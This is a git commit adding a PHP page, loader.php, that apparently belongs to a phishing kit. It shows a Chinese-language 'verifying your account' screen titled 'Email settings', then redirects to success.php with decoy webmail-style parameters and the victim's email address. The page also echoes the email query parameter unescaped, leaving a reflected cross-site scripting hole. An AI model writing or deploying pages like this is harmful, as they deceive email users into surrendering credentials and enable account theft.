661af2b29a870ec95e38b8b44e13122c0b23864b
f91801068 <f91801068@gmail.com>
2025-04-13 15:03:22 -0700

    Add files via upload

---
+++ loader.php
@@ -0,0 +1,44 @@
+<html>
+<head>
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon"/>
+
+<meta http-equiv="REFRESH" content="10; success.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1">
+
+<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'/>
+
+<title>电子邮件设置  </title></head>
+</head>
+
+<br><br>
+
+<table><tr>
+
+<td width="30"></td>
+
+<td>
+
+	<img src="files/loader.gif" width="50" height="50">
+</td>
+
+
+
+<td width="5"></td>
+
+
+
+<td>
+	
+	<font face="verdana" size="3">
+	<b>正在验证您的帐户... </b>
+	<br>
+	<font size="2"> 正在验证您的帐户，请稍候  !</font>
+	</font>
+
+</td>
+
+</tr></table>
+
+<body>
+
+</body>
+</html>
